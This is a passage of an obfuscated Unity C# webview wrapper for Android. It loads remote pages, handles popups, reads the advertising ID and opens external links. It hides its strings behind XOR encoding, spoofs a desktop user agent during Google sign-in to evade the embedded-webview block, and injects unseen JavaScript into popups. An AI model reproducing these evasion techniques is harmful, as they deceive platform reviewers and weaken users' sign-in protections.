                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[33] { 13, 2, 51, 37, 34, 118, 6, 35, 37, 62, 11, 118, 4, 51, 58, 57, 55, 50, 118, 1, 51, 52, 0, 63, 51, 33, 118, 33, 63, 34, 62, 108, 118 }, 86) + _0x9d011e67);
#endif
            }

            _0x8b5683d0.Load(_0x9d011e67);
        }
    }

    private bool _0xe44c8bb1()
    {
        if (_0x25b95b17())
            return true;
        if (_0x8b5683d0 != null && _0x8b5683d0.CanGoBack)
        {
            WLog(_0x6938ded6._0xbdc404bd(new byte[36] { 178, 155, 136, 158, 141, 155, 136, 159, 218, 152, 155, 153, 145, 218, 215, 196, 218, 151, 155, 147, 148, 218, 173, 159, 152, 172, 147, 159, 141, 218, 189, 149, 184, 155, 153, 145 }, 250));
            _0x8b5683d0.GoBack();
            return true;
        }

        return false;
    }

    private ApplicationInstallMode _0x44ce2c12 = ApplicationInstallMode.Unknown;
    private IEnumerator _0xd661dd30(IEnumerator _0x1da37a15, TaskCompletionSource<bool> _0xe4919d7e)
    {
        yield return _0x1da37a15;
        _0xe4919d7e.SetResult(true);
    }

    internal string _0x97a33dca(string _0x2484fa18)
    {
        int _0x8580aa37 = _0x2484fa18.IndexOf(_0x6938ded6._0xbdc404bd(new byte[3] { 64, 77, 20 }, 41), StringComparison.OrdinalIgnoreCase);
        if (_0x8580aa37 < 0)
            return null;
        string _0x15931638 = _0x2484fa18.Substring(_0x8580aa37 + 3);
        int _0x646f9df2 = _0x15931638.IndexOf('&');
        return _0x646f9df2 >= 0 ? _0x15931638.Substring(0, _0x646f9df2) : _0x15931638;
    }

    private void OnApplicationFocus(bool _0x2300c2d7)
    {
        isApplicationFocus = _0x2300c2d7;
        if (_0x2300c2d7 && _0xad6479a6)
        {
            _0x48bc8dc0();
        }
    }

    private void _0x1305527d(UniWebView _0x87f8aec0)
    {
        if (_0x6e1ae408)
            return;
        _0x6e1ae408 = true;
        _0x87f8aec0.AddUrlScheme(_0x6938ded6._0xbdc404bd(new byte[2] { 28, 15 }, 104));
        _0x87f8aec0.AddUrlScheme(_0x6938ded6._0xbdc404bd(new byte[6] { 127, 120, 98, 115, 120, 98 }, 22));
        _0x87f8aec0.AddUrlScheme(_0x6938ded6._0xbdc404bd(new byte[6] { 227, 239, 252, 229, 235, 250 }, 142));
        _0x87f8aec0.OnMessageReceived += (_0x505013da, _0xf1cb3406) =>
        {
            if (TryOpenExternalLikeChrome(_0xf1cb3406.RawMessage))
            {
                _0xff0c8cab(false);
                return;
            }
        };
        _0x87f8aec0.RegisterShouldHandleRequest(_0x2517e535 =>
        {
            string _0xc48fef40 = _0x2517e535 != null ? _0x2517e535.Url : string.Empty;
            if (string.IsNullOrEmpty(_0xc48fef40))
                return true;
            WLog(_0x6938ded6._0xbdc404bd(new byte[21] { 84, 111, 104, 114, 107, 99, 79, 102, 105, 99, 107, 98, 85, 98, 118, 114, 98, 116, 115, 61, 39 }, 7) + _0xc48fef40);
            if (TryOpenExternalLikeChrome(_0xc48fef40))
            {
                _0xff0c8cab(false);
                return false;
            }

            if (_0x2517e535 != null && _0x2517e535.IsMainFrame && IsGoogleAuthFlowUrl(_0xc48fef40) && !_0x5b7f34c9)
            {
                WLog(_0x6938ded6._0xbdc404bd(new byte[62] { 10, 38, 46, 41, 103, 16, 34, 37, 17, 46, 34, 48, 103, 35, 34, 51, 34, 36, 51, 34, 35, 103, 0, 40, 40, 32, 43, 34, 103, 38, 50, 51, 47, 103, 18, 21, 11, 103, 106, 121, 103, 53, 34, 43, 40, 38, 35, 103, 48, 46, 51, 47, 103, 0, 40, 40, 32, 43, 34, 103, 18, 6 }, 71));
                _0x5b7f34c9 = true;
                _0xff0c8cab(true);
                _0x8b5683d0.SetUserAgent(_0xf5082241());
                _0x8b5683d0.Load(_0xc48fef40);
                return false;
            }

            return true;
        });
        _0x87f8aec0.OnLoadingErrorReceived += (_0x505013da, _0x3a7e3057, _0xf1cb3406, _0xff0ef64e) =>
        {
            WLog(_0x6938ded6._0xbdc404bd(new byte[25] { 237, 193, 201, 206, 128, 247, 197, 194, 246, 201, 197, 215, 128, 229, 210, 210, 207, 210, 154, 128, 195, 207, 196, 197, 157 }, 160) + _0x3a7e3057 + _0x6938ded6._0xbdc404bd(new byte[9] { 178, 255, 247, 225, 225, 243, 245, 247, 175 }, 146) + _0xf1cb3406);
            string _0x03ff5dc9 = GetFailingUrl(_0xff0ef64e);
            if (string.IsNullOrEmpty(_0x03ff5dc9) || IsAboutBlank(_0x03ff5dc9))
                return;
            _ = _0x3377193a(_0x6938ded6._0xbdc404bd(new byte[8] { 68, 69, 108, 86, 65, 65, 92, 65 }, 51));
            WLog(_0x6938ded6._0xbdc404bd(new byte[45] { 87, 123, 115, 116, 58, 77, 127, 120, 76, 115, 127, 109, 58, 124, 123, 115, 118, 115, 116, 125, 58, 79, 72, 86, 58, 55, 36, 58, 117, 106, 127, 116, 58, 127, 98, 110, 127, 104, 116, 123, 118, 118, 99, 32, 58 }, 26) + _0x03ff5dc9);
            StopCurrentFailedLoad(_0x505013da);
            _0xd5d6a311(_0x03ff5dc9);
        };
        _0x87f8aec0.OnPageStarted += (_0x505013da, _0x7ae65879) =>
        {
            _0xfc50c348 = 0;
            if (_0x9f636f33 && IsAboutBlank(_0x7ae65879))
            {
                WLog(_0x6938ded6._0xbdc404bd(new byte[27] { 221, 255, 232, 250, 236, 255, 224, 173, 236, 239, 226, 248, 249, 183, 239, 225, 236, 227, 230, 173, 254, 249, 236, 255, 249, 232, 233 }, 141));
                return;
            }

            WLog(_0x6938ded6._0xbdc404bd(new byte[29] { 206, 226, 234, 237, 163, 212, 230, 225, 213, 234, 230, 244, 163, 204, 237, 211, 226, 228, 230, 208, 247, 226, 241, 247, 230, 231, 185, 163, 168 }, 131) + (Time.realtimeSinceStartup - _0xfd278a27).ToString(_0x6938ded6._0xbdc404bd(new byte[5] { 202, 212, 202, 202, 202 }, 250)) + _0x6938ded6._0xbdc404bd(new byte[2] { 42, 121 }, 89) + _0x7ae65879);
            if (TryOpenExternalLikeChrome(_0x7ae65879))
            {
                StopCurrentFailedLoad(_0x505013da);
                return;
            }

            if (ContainsIgnoreCase(_0x7ae65879, _0x6938ded6._0xbdc404bd(new byte[8] { 70, 75, 75, 67, 12, 67, 82, 82 }, 34)) || ContainsIgnoreCase(_0x7ae65879, _0x6938ded6._0xbdc404bd(new byte[15] { 200, 217, 193, 150, 207, 209, 220, 223, 221, 204, 150, 218, 212, 215, 223 }, 184)) || _0x7ae65879.StartsWith(_0x6938ded6._0xbdc404bd(new byte[25] { 223, 195, 195, 199, 196, 141, 152, 152, 213, 199, 208, 219, 216, 213, 214, 219, 209, 214, 193, 153, 219, 222, 193, 210, 152 }, 183), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0x505013da);
                OpenUrlExternally(_0x7ae65879);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0x7ae65879))
            {
                _0xff0c8cab(true);
                WLog(_0x6938ded6._0xbdc404bd(new byte[41] { 83, 123, 123, 115, 120, 113, 52, 117, 97, 96, 124, 52, 114, 120, 123, 99, 52, 112, 113, 96, 113, 119, 96, 113, 112, 52, 57, 42, 52, 127, 113, 113, 100, 52, 98, 125, 103, 125, 118, 120, 113 }, 20));
                return;
            }

            _0xcc2a273b = true;
            _0xff0c8cab(true);
            WLog(_0x6938ded6._0xbdc404bd(new byte[43] { 187, 137, 142, 186, 133, 137, 155, 204, 128, 131, 141, 136, 133, 130, 139, 195, 158, 137, 136, 133, 158, 137, 143, 152, 133, 130, 139, 204, 193, 210, 204, 135, 137, 137, 156, 204, 154, 133, 159, 133, 142, 128, 137 }, 236));
        };
        _0x87f8aec0.OnPageCommitted += (_0x505013da, _0x7ae65879) =>
        {
            if (_0x9f636f33 && IsAboutBlank(_0x7ae65879))
                return;
            WLog(_0x6938ded6._0xbdc404bd(new byte[31] { 197, 233, 225, 230, 168, 223, 237, 234, 222, 225, 237, 255, 168, 199, 230, 216, 233, 239, 237, 203, 231, 229, 229, 225, 252, 252, 237, 236, 178, 168, 163 }, 136) + (Time.realtimeSinceStartup - _0xfd278a27).ToString(_0x6938ded6._0xbdc404bd(new byte[5] { 64, 94, 64, 64, 64 }, 112)) + _0x6938ded6._0xbdc404bd(new byte[2] { 4, 87 }, 119) + _0x7ae65879);
            if (!firstLoadShown && IsHttpUrl(_0x7ae65879))
            {
                firstLoadShown = true;
                _0xcc2a273b = false;
                _0xff0c8cab(false);
                _0xa3cbcc5a();
                _0xd9c381a4();
                _0x505013da.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x3377193a(_0x6938ded6._0xbdc404bd(new byte[9] { 113, 112, 89, 105, 118, 99, 104, 99, 98 }, 6));
                WLog(_0x6938ded6._0xbdc404bd(new byte[39] { 75, 103, 111, 104, 38, 81, 99, 100, 80, 111, 99, 113, 38, 117, 110, 105, 113, 104, 38, 105, 104, 38, 101, 105, 107, 107, 111, 114, 114, 99, 98, 38, 101, 105, 104, 114, 99, 104, 114 }, 6));
            }
        };
        _0x87f8aec0.OnPageProgressChanged += (_0x505013da, _0x65137eec) =>
        {
            if (_0x9f636f33)
                return;
            if (!firstLoadShown && _0x65137eec >= 0.65f)
            {
                firstLoadShown = true;
                _0xcc2a273b = false;
                _0xff0c8cab(false);
                _0xa3cbcc5a();
                _0xd9c381a4();
                _0x505013da.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x3377193a(_0x6938ded6._0xbdc404bd(new byte[9] { 68, 69, 108, 92, 67, 86, 93, 86, 87 }, 51));
                WLog(_0x6938ded6._0xbdc404bd(new byte[32] { 197, 233, 225, 230, 168, 223, 237, 234, 222, 225, 237, 255, 168, 251, 224, 231, 255, 230, 168, 234, 241, 168, 248, 250, 231, 239, 250, 237, 251, 251, 178, 168 }, 136) + _0x65137eec);
            }
        };
        _0x87f8aec0.OnPageFinished += (_0x505013da, _0x3a7e3057, _0x7ae65879) =>
        {
            if (_0x9f636f33 && IsAboutBlank(_0x7ae65879))
            {
                _0x9f636f33 = false;
                WLog(_0x6938ded6._0xbdc404bd(new byte[28] { 251, 217, 206, 220, 202, 217, 198, 139, 202, 201, 196, 222, 223, 145, 201, 199, 202, 197, 192, 139, 205, 194, 197, 194, 216, 195, 206, 207 }, 171));
                return;
            }

            WLog(_0x6938ded6._0xbdc404bd(new byte[24] { 82, 126, 118, 113, 63, 72, 122, 125, 73, 118, 122, 104, 63, 89, 118, 113, 118, 108, 119, 122, 123, 37, 63, 52 }, 31) + (Time.realtimeSinceStartup - _0xfd278a27).ToString(_0x6938ded6._0xbdc404bd(new byte[5] { 26, 4, 26, 26, 26 }, 42)) + _0x6938ded6._0xbdc404bd(new byte[7] { 62, 109, 46, 34, 41, 40, 112 }, 77) + _0x3a7e3057 + _0x6938ded6._0xbdc404bd(new byte[5] { 133, 208, 215, 201, 152 }, 165) + _0x7ae65879);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0xcc2a273b = false;
                _0xff0c8cab(false);
                _0xa3cbcc5a();
                _0xd9c381a4();
                _0x505013da.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x3377193a(_0x6938ded6._0xbdc404bd(new byte[9] { 198, 199, 238, 222, 193, 212, 223, 212, 213 }, 177));
                WLog(_0x6938ded6._0xbdc404bd(new byte[33] { 136, 164, 172, 171, 229, 146, 160, 167, 147, 172, 160, 178, 229, 163, 172, 183, 182, 177, 229, 169, 170, 164, 161, 229, 166, 170, 168, 181, 169, 160, 177, 160, 161 }, 197));
            }
            else if (_0xcc2a273b)
            {
                _0xcc2a273b = false;
                _0xff0c8cab(false);
                _0x505013da.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x6938ded6._0xbdc404bd(new byte[40] { 207, 227, 235, 236, 162, 213, 231, 224, 212, 235, 231, 245, 162, 209, 234, 237, 245, 162, 227, 228, 246, 231, 240, 162, 238, 237, 227, 230, 235, 236, 229, 162, 228, 235, 236, 235, 241, 234, 231, 230 }, 130));
            }
            else
            {
                _0xff0c8cab(false);
            }

            if (_0x5b7f34c9 && !IsGoogleAuthFlowUrl(_0x7ae65879) && !IsGoogleAuthFlowUrl(_0x7ae65879))
            {
                WLog(_0x6938ded6._0xbdc404bd(new byte[48] { 147, 187, 187, 179, 184, 177, 244, 181, 161, 160, 188, 244, 167, 177, 177, 185, 167, 244, 178, 189, 186, 189, 167, 188, 177, 176, 244, 249, 234, 244, 166, 177, 167, 160, 187, 166, 177, 244, 176, 177, 178, 181, 161, 184, 160, 244, 129, 149 }, 212));
                _0x5b7f34c9 = false;
                _0x8b5683d0.SetUserAgent("");
            }
        };
        _0x87f8aec0.OnShouldClose += _0x505013da =>
        {
            WLog(_0x6938ded6._0xbdc404bd(new byte[41] { 95, 80, 97, 119, 112, 89, 36, 73, 101, 109, 106, 36, 83, 97, 102, 82, 109, 97, 115, 36, 75, 106, 87, 108, 107, 113, 104, 96, 71, 104, 107, 119, 97, 36, 109, 106, 114, 107, 111, 97, 96 }, 4));
            _0x37abf804();
            return false;
        };
        // POPUP HANDLING LOGIC
        _0x87f8aec0.SetPopupPageEventEnabled(true);
        bool _0xa417fff0 = false;
        bool _0x95949f5d = false;
        _0x87f8aec0.OnMultipleWindowOpened += (_0x505013da, _0x7703c9c0) =>
        {
            _0x505013da.ScrollTo(0, 0, false);
            WLog(_0x6938ded6._0xbdc404bd(new byte[43] { 245, 250, 203, 221, 218, 243, 142, 227, 207, 199, 192, 142, 249, 203, 204, 248, 199, 203, 217, 142, 227, 219, 194, 218, 199, 222, 194, 203, 249, 199, 192, 202, 193, 217, 142, 225, 222, 203, 192, 203, 202, 148, 142 }, 174) + _0x7703c9c0);
            var _0x2014db0e = _0x87f8aec0.GetPopupWindow(_0x7703c9c0);
            if (_0x2014db0e == null)
                return;
            _0x0a749e0b.Add(_0x2014db0e);
            Debug.Log($"[Test] Popup ID: {_0x2014db0e.Id}");
            _0x2014db0e.OnPageStarted += (_0x0edb7f41, _0x7ae65879) =>
            {
                WLog(_0x6938ded6._0xbdc404bd(new byte[36] { 29, 18, 35, 53, 50, 27, 102, 22, 41, 54, 51, 54, 102, 17, 35, 36, 16, 47, 35, 49, 102, 9, 40, 22, 39, 33, 35, 21, 50, 39, 52, 50, 35, 34, 124, 102 }, 70) + _0x7ae65879);
                _0xfc50c348 = 0;
                if (string.IsNullOrEmpty(_0x7ae65879) || IsAboutBlank(_0x7ae65879))
                    return;
                if (IsGoogleAuthFlowUrl(_0x7ae65879))
                {
                    WLog(_0x6938ded6._0xbdc404bd(new byte[57] { 250, 245, 196, 210, 213, 252, 129, 241, 206, 209, 212, 209, 129, 230, 206, 206, 198, 205, 196, 129, 192, 212, 213, 201, 129, 199, 205, 206, 214, 129, 140, 159, 129, 210, 209, 206, 206, 199, 129, 230, 206, 206, 198, 205, 196, 129, 226, 201, 211, 206, 204, 196, 129, 244, 224, 155, 129 }, 161) + _0x7ae65879);
                    _0xa417fff0 = false;
                    _0x5e0fef1c();
                    if (_0x0edb7f41 != null && _0x0edb7f41.IsAlive)
                        _0x0edb7f41.EvaluateJavaScript(_0xdb81eae3());
                    return;
                }

                if (_0x8b5683d0 == null)
                    return;
                if (!_0xa417fff0)
                {
                    _0xa417fff0 = true;
                    _0x8b5683d0.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x6938ded6._0xbdc404bd(new byte[39] { 171, 164, 149, 131, 132, 173, 208, 160, 159, 128, 133, 128, 208, 145, 128, 128, 156, 137, 208, 167, 153, 158, 148, 159, 135, 131, 208, 148, 149, 131, 155, 132, 159, 128, 208, 165, 177, 202, 208 }, 240) + _0x7ae65879);
                }

                if (_0x0edb7f41 != null && _0x0edb7f41.IsAlive)
                    _0x0edb7f41.EvaluateJavaScript(_0x45024f6e());
                if (!_0x95949f5d && _0x0edb7f41 != null && _0x0edb7f41.IsAlive && IsHttpUrl(_0x7ae65879))
                {
                    _0x95949f5d = true;
                }
            };
            _0x2014db0e.OnPageFinished += (_0x0edb7f41, _0xff0ef64e) =>
            {
                string _0x466a9ea0 = _0xff0ef64e != null ? _0xff0ef64e.data : string.Empty;
                WLog(_0x6938ded6._0xbdc404bd(new byte[35] { 85, 90, 107, 125, 122, 83, 46, 94, 97, 126, 123, 126, 46, 89, 107, 108, 88, 103, 107, 121, 46, 72, 103, 96, 103, 125, 102, 107, 106, 52, 46, 123, 124, 98, 51 }, 14) + _0x466a9ea0);
                if (_0x0edb7f41 == null || !_0x0edb7f41.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0x466a9ea0))
                {
                    _0x5e0fef1c();
                    _0x0edb7f41.EvaluateJavaScript(_0xdb81eae3());
                    return;
                }

                if (!_0xa417fff0)
                    return;
                _0x0edb7f41.EvaluateJavaScript(_0x45024f6e());
            };
        };
        _0x87f8aec0.OnMultipleWindowClosed += (_0x505013da, _0x7703c9c0) =>
        {
            _0x0a749e0b.RemoveAll(_0xb6894b3d => _0xb6894b3d == null || _0xb6894b3d.Id == _0x7703c9c0 || !_0xb6894b3d.IsAlive);
            _0xff0c8cab(false);
            if (_0x0a749e0b.Count == 0 && _0x8b5683d0 != null)
            {
                _0xa417fff0 = false;
                _0x95949f5d = false;
                _0xacdbb011();
            }

            WLog(_0x6938ded6._0xbdc404bd(new byte[43] { 108, 99, 82, 68, 67, 106, 23, 122, 86, 94, 89, 23, 96, 82, 85, 97, 94, 82, 64, 23, 122, 66, 91, 67, 94, 71, 91, 82, 96, 94, 89, 83, 88, 64, 23, 116, 91, 88, 68, 82, 83, 13, 23 }, 55) + _0x7703c9c0);
        };
        _0x87f8aec0.RegisterOnRequestMediaCapturePermission(_0x2517e535 =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    private string _0x47f4b2cf;
    private bool OpenUrlExternally(string _0xf236a520)
    {
        return _0x99999d7a(_0xf236a520);
    }

    internal bool IsHttpUrl(string _0x455ec774)
    {
        if (string.IsNullOrEmpty(_0x455ec774))
            return false;
        return _0x455ec774.StartsWith(_0x6938ded6._0xbdc404bd(new byte[7] { 118, 106, 106, 110, 36, 49, 49 }, 30), StringComparison.OrdinalIgnoreCase) || _0x455ec774.StartsWith(_0x6938ded6._0xbdc404bd(new byte[8] { 63, 35, 35, 39, 36, 109, 120, 120 }, 87), StringComparison.OrdinalIgnoreCase);
    }

    private string _0x932c2ce6 = "";
    private int _0x30353436 = -1;
    private string _0xf1c054b2 = "";
    private async void Start()
    {
        await _0x82b7e192();
    }

    private string _0x62619bf7()
    {
        string _0x123c4650 = _0x6938ded6._0xbdc404bd(new byte[62] { 192, 195, 194, 197, 196, 199, 198, 201, 200, 203, 202, 205, 204, 207, 206, 209, 208, 211, 210, 213, 212, 215, 214, 217, 216, 219, 224, 227, 226, 229, 228, 231, 230, 233, 232, 235, 234, 237, 236, 239, 238, 241, 240, 243, 242, 245, 244, 247, 246, 249, 248, 251, 145, 144, 147, 146, 149, 148, 151, 150, 153, 152 }, 161);
        System.Random _0xe4c81d0f = new System.Random();
        int _0x16883396 = _0xe4c81d0f.Next(8, 16);
        return new string (Enumerable.Repeat(_0x123c4650, _0x16883396).Select(_0xec812563 => _0xec812563[_0xe4c81d0f.Next(_0xec812563.Length)]).ToArray());
    }

    private async Task<bool> _0x40c419e6()
    {
        _0xc587caa3.Instance?._0x440b57be();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0x079b1fd1) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x6938ded6._0xbdc404bd(new byte[32] { 39, 40, 25, 15, 8, 33, 92, 41, 18, 21, 8, 5, 92, 44, 9, 15, 20, 92, 50, 19, 8, 21, 26, 21, 31, 29, 8, 21, 19, 18, 70, 92 }, 124) + string.Join(_0x6938ded6._0xbdc404bd(new byte[1] { 52 }, 61), _0x079b1fd1));
                }
#endif
            }
        };
        try
        {
            _0x8c66a763 = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x6938ded6._0xbdc404bd(new byte[31] { 242, 253, 204, 218, 221, 244, 137, 239, 200, 192, 197, 204, 205, 137, 221, 198, 137, 206, 204, 221, 137, 217, 220, 218, 193, 137, 221, 198, 194, 204, 199 }, 169));
                }
#endif
            }

            _0x8c66a763 = "";
        }

        _0xc384fffc = !string.IsNullOrEmpty(_0x8c66a763);
        _0xf1c054b2 = _0xaeed1bf4();
        {
#if B_LOGS
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[25] { 1, 14, 63, 41, 46, 7, 122, 15, 52, 51, 46, 35, 122, 10, 47, 41, 50, 122, 14, 53, 49, 63, 52, 96, 122 }, 90) + _0x8c66a763);
#endif
        }

        _0xc587caa3.Instance?._0x8f69ae24();
        return false;
    }

    private async Task _0x82b7e192()
    {
        if (await _0xa4751a89())
            return;
        if (await _0x40c419e6())
            return;
        if (await _0x167f421e())
            return;
        _0x379fa048();
        await _0x623d800f(_0x8f95c7bb());
        _0x4e4d1e58 = await _0xb984db94();
        await _0x8850e7e3();
    }

    private bool _0x99999d7a(string _0x1b85db8b)
    {
        try
        {
            using (var _0xd81d0a7a = new AndroidJavaClass(_0x6938ded6._0xbdc404bd(new byte[30] { 131, 143, 141, 206, 149, 142, 137, 148, 153, 211, 132, 206, 144, 140, 129, 153, 133, 146, 206, 181, 142, 137, 148, 153, 176, 140, 129, 153, 133, 146 }, 224)))
            using (var _0x2cb664e7 = _0xd81d0a7a.GetStatic<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[15] { 125, 107, 108, 108, 123, 112, 106, 95, 125, 106, 119, 104, 119, 106, 103 }, 30)))
            using (var _0xdc9c5aa6 = new AndroidJavaClass(_0x6938ded6._0xbdc404bd(new byte[15] { 21, 26, 16, 6, 27, 29, 16, 90, 26, 17, 0, 90, 33, 6, 29 }, 116)))
            using (var _0x060d1331 = _0xdc9c5aa6.CallStatic<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[5] { 24, 9, 26, 27, 13 }, 104), _0x1b85db8b))
            using (var _0x2774e378 = new AndroidJavaObject(_0x6938ded6._0xbdc404bd(new byte[22] { 173, 162, 168, 190, 163, 165, 168, 226, 175, 163, 162, 184, 169, 162, 184, 226, 133, 162, 184, 169, 162, 184 }, 204), _0x6938ded6._0xbdc404bd(new byte[26] { 235, 228, 238, 248, 229, 227, 238, 164, 227, 228, 254, 239, 228, 254, 164, 235, 233, 254, 227, 229, 228, 164, 220, 195, 207, 221 }, 138), _0x060d1331))
            {
                WLog(_0x6938ded6._0xbdc404bd(new byte[26] { 243, 216, 194, 223, 221, 213, 252, 217, 219, 213, 144, 223, 192, 213, 222, 144, 213, 200, 196, 213, 194, 222, 209, 220, 138, 144 }, 176) + _0x1b85db8b);
                _0x2774e378.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[11] { 2, 7, 7, 32, 2, 23, 6, 4, 12, 17, 26 }, 99), _0x6938ded6._0xbdc404bd(new byte[33] { 113, 126, 116, 98, 127, 121, 116, 62, 121, 126, 100, 117, 126, 100, 62, 115, 113, 100, 117, 119, 127, 98, 105, 62, 82, 66, 95, 71, 67, 81, 82, 92, 85 }, 16));
                _0x2774e378.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[8] { 58, 63, 63, 29, 55, 58, 60, 40 }, 91), 0x10000000);
                _0x2cb664e7.Call(_0x6938ded6._0xbdc404bd(new byte[13] { 13, 10, 31, 12, 10, 63, 29, 10, 23, 8, 23, 10, 7 }, 126), _0x2774e378);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x6938ded6._0xbdc404bd(new byte[28] { 217, 242, 232, 245, 247, 255, 214, 243, 241, 255, 186, 255, 226, 238, 255, 232, 244, 251, 246, 186, 252, 251, 243, 246, 255, 254, 160, 186 }, 154) + e.Message);
            Application.OpenURL(_0x1b85db8b);
            return true;
        }
    }

    private string GetFailingUrl(UniWebViewNativeResultPayload _0xae6a74aa)
    {
        if (_0xae6a74aa == null || _0xae6a74aa.Extra == null)
            return null;
        object _0x2af885c7;
        if (!_0xae6a74aa.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0x2af885c7))
            return null;
        return _0x2af885c7 as string;
    }

    private bool _0x6e1ae408 = false;
    private void _0xd5d6a311(string _0xc98fcc1d)
    {
        if (string.IsNullOrEmpty(_0xc98fcc1d))
            return;
        if (TryOpenExternalLikeChrome(_0xc98fcc1d))
            return;
        OpenUrlExternally(_0xc98fcc1d);
    }

    private bool _0xcc2a273b = false;
    private string _0x4208a47a { get; set; }

    private string _0xf5082241()
    {
        if (string.IsNullOrEmpty(_0x4c49f262) && _0x8b5683d0 != null)
            _0x4c49f262 = _0x8b5683d0.GetUserAgent();
        if (string.IsNullOrEmpty(_0x4c49f262))
            return string.Empty;
        string _0x053d225a = Regex.Replace(_0x4c49f262, _0x6938ded6._0xbdc404bd(new byte[11] { 221, 242, 171, 186, 221, 242, 171, 246, 247, 221, 227 }, 129), string.Empty);
        _0x053d225a = Regex.Replace(_0x053d225a, _0x6938ded6._0xbdc404bd(new byte[15] { 53, 26, 66, 43, 28, 0, 5, 13, 70, 50, 55, 82, 64, 52, 66 }, 105), string.Empty);
        _0x053d225a = Regex.Replace(_0x053d225a, _0x6938ded6._0xbdc404bd(new byte[15] { 179, 128, 151, 150, 140, 138, 139, 202, 209, 185, 203, 213, 185, 150, 207 }, 229), string.Empty);
        return Regex.Replace(_0x053d225a, _0x6938ded6._0xbdc404bd(new byte[6] { 47, 0, 8, 65, 95, 14 }, 115), _0x6938ded6._0xbdc404bd(new byte[1] { 251 }, 219)).Trim();
    }

    private IEnumerator _0x02a6f1d9(float _0x9b9b49ad)
    {
        yield return new WaitForSeconds(_0x9b9b49ad);
        if (!_0x90914ba6)
        {
            _0x90914ba6 = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0x9429181c}");
                }
#endif
            }
        }
    }

    private float _0xfd278a27 = 0f;
    private void _0x57d140fe()
    {
        if (_0xe51c0a8a)
        {
            WLog(_0x6938ded6._0xbdc404bd(new byte[18] { 249, 196, 213, 200, 156, 221, 208, 206, 217, 221, 216, 197, 156, 207, 212, 211, 203, 210 }, 188));
            return;
        }

        _0xff0c8cab(false);
        WLog(_0x6938ded6._0xbdc404bd(new byte[46] { 52, 24, 16, 23, 89, 46, 28, 27, 47, 16, 28, 14, 89, 41, 12, 10, 17, 89, 55, 22, 13, 16, 31, 16, 26, 24, 13, 16, 22, 23, 89, 81, 17, 24, 11, 29, 14, 24, 11, 28, 89, 27, 24, 26, 18, 80 }, 121));
        ++_0xfc50c348;
        _0x960b2809();
        if (_0xfc50c348 <= 1)
            return;
        if (_0x658f852a())
        {
            WLog(_0x6938ded6._0xbdc404bd(new byte[37] { 198, 251, 234, 247, 163, 240, 232, 234, 243, 243, 230, 231, 163, 174, 189, 163, 243, 236, 243, 246, 243, 240, 163, 240, 247, 234, 239, 239, 163, 236, 243, 230, 237, 230, 231, 185, 163 }, 131) + _0x0a749e0b.Count);
            return;
        }

        Application.Quit();
    }

    // PART 3
    private string _0x3df961de()
    {
        try
        {
            var _0xb68ada08 = new AndroidJavaClass(_0x6938ded6._0xbdc404bd(new byte[30] { 125, 113, 115, 48, 107, 112, 119, 106, 103, 45, 122, 48, 110, 114, 127, 103, 123, 108, 48, 75, 112, 119, 106, 103, 78, 114, 127, 103, 123, 108 }, 30));
            var _0xb2609e8a = _0xb68ada08.GetStatic<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[15] { 105, 127, 120, 120, 111, 100, 126, 75, 105, 126, 99, 124, 99, 126, 115 }, 10));
            var _0xe1dbceda = new AndroidJavaClass(_0x6938ded6._0xbdc404bd(new byte[57] { 18, 30, 28, 95, 22, 30, 30, 22, 29, 20, 95, 16, 31, 21, 3, 30, 24, 21, 95, 22, 28, 2, 95, 16, 21, 2, 95, 24, 21, 20, 31, 5, 24, 23, 24, 20, 3, 95, 48, 21, 7, 20, 3, 5, 24, 2, 24, 31, 22, 56, 21, 50, 29, 24, 20, 31, 5 }, 113));
            var _0x4a1ab2ff = _0xe1dbceda.CallStatic<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[20] { 22, 20, 5, 48, 21, 7, 20, 3, 5, 24, 2, 24, 31, 22, 56, 21, 56, 31, 23, 30 }, 113), _0xb2609e8a);
            var _0x616d5da9 = _0x4a1ab2ff.Call<string>(_0x6938ded6._0xbdc404bd(new byte[5] { 157, 159, 142, 179, 158 }, 250));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0x616d5da9}");
#endif
            }

            return string.IsNullOrEmpty(_0x616d5da9) ? "" : _0x616d5da9;
        }
        catch
        {
            return "";
        }
    }

    private string _0xf3c53283 = "";
    private bool _0x6e8074aa(string _0x6d822c8e)
    {
        if (string.IsNullOrEmpty(_0x6d822c8e))
            return false;
        try
        {
            using (var _0xf7a4e556 = new AndroidJavaClass(_0x6938ded6._0xbdc404bd(new byte[30] { 25, 21, 23, 84, 15, 20, 19, 14, 3, 73, 30, 84, 10, 22, 27, 3, 31, 8, 84, 47, 20, 19, 14, 3, 42, 22, 27, 3, 31, 8 }, 122)))
